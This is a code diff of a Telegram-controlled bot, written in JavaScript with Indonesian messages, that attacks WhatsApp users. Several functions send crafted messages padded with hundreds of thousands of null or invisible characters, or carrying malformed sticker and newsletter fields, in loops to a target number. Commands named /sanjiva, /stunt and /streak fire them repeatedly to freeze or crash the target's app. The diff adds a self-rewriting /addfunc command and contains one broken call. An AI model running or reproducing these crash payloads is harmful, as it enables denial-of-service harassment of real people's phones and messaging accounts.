@@ -518,115 +518,43 @@ async function VnXDelayXFcNew(sock, target) {
 }
 
 async function delaynewinvisibleVnX(sock, target) {
-  while (true) {
-    try {   
-      const MsgNew = {
-        groupStatusMessageV2: {
-          message: {
-            interactiveResponseMessage: {                     
-              body: {
-                text: "VnXNgelay",
-                format: "DEFAULT"
-              },
-              nativeFlowResponseMessage: {
-                name: "galaxy_message",
-                paramsJson: "\u0000".repeat(400000),
-                version: 3
-              },
-              entryPointConversionSource: "call_permission_request"
-            }
-          }
-        }
-      };
+  while (true) {
+    try {   
+      const MsgNew = {
+        groupStatusMessageV2: {
+          message: {
+            interactiveResponseMessage: {                     
+              body: {
+                text: "VnXNgelay",
+                format: "DEFAULT"
+              },
+              nativeFlowResponseMessage: {
+                name: "galaxy_message",
+                paramsJson: "\u0000".repeat(400000),
+                version: 3
+              },
+              entryPointConversionSource: "call_permission_request"
+            }
+          }
+        }
+      };
 
-      await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
-      
-      console.log(` VnX Sent to ${target}`);
-      await new Promise(resolve => setTimeout(resolve, 1200));
+      await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
+      
+      console.log(` VnX Sent to ${target}`);
+      await new Promise(resolve => setTimeout(resolve, 1200));
 
-    } catch (e) {
-      console.log("Error:", e);
-      await new Promise(resolve => setTimeout(resolve, 5000));
-    }
-  }
+    } catch (e) {
+      console.log("Error:", e);
+      await new Promise(resolve => setTimeout(resolve, 5000));
+    }
+  }
 }
 
-async function kresMamahMu(sock, target) {
-  await sock.relayMessage(target, {
-    groupStatusMessageV2: {
-      message: {
-        stickerMessage: {
-          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-          mimetype: "image/webp",
-          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-          fileLength: "10610",
-          mediaKeyTimestamp: "1775044724",
-          stickerSentTs: "1775044724091"
-        }
-      },
-      header: {
-        hasMediaAttachment: true,
-        jpegThumbnail: null,
-        title: "\x10"
-      },
-      forwardedNewsletterMessageInfo: {
-        newsletterJid: "1@g.us",
-        serverMessageId: 1,
-        newsletterName: "+",
-        contentType: "UPDATE",
-        accessibilityText: "×"
-      },
-      contextInfo: {
-        forwardingScore: 555,
-        isForwarded: true,
-        quotedAd: {
-          advertiserName: "👾",
-          caption: "\u0003"
-        },
-        placeholderKey: {
-          remoteJid: "1750291478@broadcast",
-          fromMe: false,
-          id: "ABCDEF1234567890"
-        },
-        externalAdReply: {
-          showAdAttribution: false,
-          renderLargerThumbnail: false,
-          title: 's3s',
-          body: "🫀",
-          previewType: "VIDEO",
-          mediaType: "VIDEO",
-          thumbnail: null,
-          sourceUrl: "kl@trash.lol",
-          mediaUrl: "kl@trash.lol",
-          sourceType: "¿?",
-          sourceId: "ABCDEF1234567890",
-          containsAutoReply: true,
-          ctwaClid: "ctwaClid",
-          ref: "ref"
-        },
-        annotations: [{
-          polygonVertices: [{
-            x: 25022008,
-            y: -25022008
-          }],
-          newsletter: {
-            newsletterJid: target,
-            newsletterName: "destroyer",
-            serverMessageId: 999,
-            contentType: "UPDATE",
-            accessibilityText: "#"
-          }
-        }]
-      }
-    }
-  }, {
-    participant: {
-      jid: target
-    }
-  });
+async function VisiNoob(sock, target) {
+  for (let i = 0; i < 50; i++) {
+    await sock.sendMessage(target, { text: "\u200e".repeat(600000) });
+  }
 }
 
 // ================= HELPER FUNCTIONS ================= //
@@ -693,6 +621,79 @@ async function performFullUpdate(chatId) {
     return false;
   }
 }
+
+// ================= FITUR ADD FUNC ================= //
+
+async function updateCommandFunction(commandName, loopCount, sleepMs, functionCalls) {
+  try {
+    let content = fs.readFileSync(__filename, "utf8");
+    
+    const commandRegex = new RegExp(`bot\\.onText\\(\\/\\/${commandName}\\(\\?:\\s\\+(\\\\.+)\\)\\?/, async \\(msg, match\\) => \\{([\\s\\S]*?)\\n\\}\\);`, 'g');
+    
+    const functionCallLines = functionCalls.split(',').map(f => f.trim());
+    
+    let loopBody = '';
+    for (const call of functionCallLines) {
+      loopBody += `      ${call}\\n`;
+      loopBody += `      await sleep(${sleepMs});\\n`;
+    }
+    
+    const newLoopCode = `    for (let i = 0; i < ${loopCount}; i++) {\\n${loopBody}    }`;
+    
+    const oldCommandMatch = content.match(commandRegex);
+    if (oldCommandMatch) {
+      const oldCode = oldCommandMatch[0];
+      const oldLoopRegex = /for \(let i = 0; i < \d+; i\+\+\) \{[\s\S]*?\n    \}/;
+      const newCode = oldCode.replace(oldLoopRegex, newLoopCode);
+      content = content.replace(oldCommandMatch[0], newCode);
+      
+      fs.writeFileSync(__filename, content);
+      return true;
+    }
+    
+    return false;
+  } catch (error) {
+    console.error("Error updating command function:", error);
+    return false;
+  }
+}
+
+bot.onText(/\/addfunc (.+)/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  if (!isOwner(msg.from.id)) {
+    await bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan perintah ini.");
+    return;
+  }
+  
+  const args = match[1].split(',');
+  if (args.length < 4) {
+    await bot.sendMessage(chatId, "❌ Format: /addfunc <cmdName>,<loopCount>,<sleepMs>,<functionCall1,functionCall2,...>\\nContoh: /addfunc streak,10,1000,await delaynewinvisibleVnX(sock, target),await VsxCrashDelay(sock, target)");
+    return;
+  }
+  
+  const cmdName = args[0].trim();
+  const loopCount = parseInt(args[1].trim());
+  const sleepMs = parseInt(args[2].trim());
+  const functionCalls = args.slice(3).join(',').trim();
+  
+  if (isNaN(loopCount) || isNaN(sleepMs)) {
+    await bot.sendMessage(chatId, "❌ loopCount dan sleepMs harus berupa angka!");
+    return;
+  }
+  
+  await bot.sendMessage(chatId, `🔄 Mengupdate command /${cmdName} dengan loop ${loopCount}x dan sleep ${sleepMs}ms...`);
+  
+  const success = await updateCommandFunction(cmdName, loopCount, sleepMs, functionCalls);
+  
+  if (success) {
+    await bot.sendMessage(chatId, `✅ Berhasil mengupdate command /${cmdName}!\\n\\nRestarting bot...`);
+    setTimeout(() => {
+      process.exit(0);
+    }, 2000);
+  } else {
+    await bot.sendMessage(chatId, `❌ Gagal mengupdate command /${cmdName}. Pastikan command tersebut ada.`);
+  }
+});
 
 // ================= FITUR BARU ================= //
 
@@ -921,9 +922,9 @@ bot.onText(/\/sanjiva(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    for (let i = 0; i < 7; i++) {
+    for (let i = 0; i < 10; i++) {
       await delaynewinvisibleVnX(sock, target);
-      await sleep(3);
+      await sleep(2);
       console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
     }
     
@@ -1205,8 +1206,8 @@ bot.onText(/\/stunt(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    for (let i = 0; i < 400; i++) {
-      await kresMamahMu(sock, target);
+    for (let i = 0; i < 500; i++) {
+      await VnXDelayXFcNew(sock, target);
       await sleep(2000);
       console.log(chalk.green(`✅ Success Sending Force Close to ${target}`));
     }
@@ -1262,7 +1263,7 @@ bot.onText(/\/streak(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    await VisiNoob(sock, target);
+    await (sock, target);
     
     console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
     
@@ -1329,6 +1330,7 @@ bot.onText(/\/menu/, async (msg) => {
 │ ❀ /runcmd <command>
 │ ❀ /fullupdate - update dari GitHub
 │ ❀ /cekupdate - cek update GitHub
+│ ❀ /addfunc <cmd>,<loop>,<sleep>,<func1,func2,...> - update func
 ╰═════════════════❀\`\`\``;
 
   try {
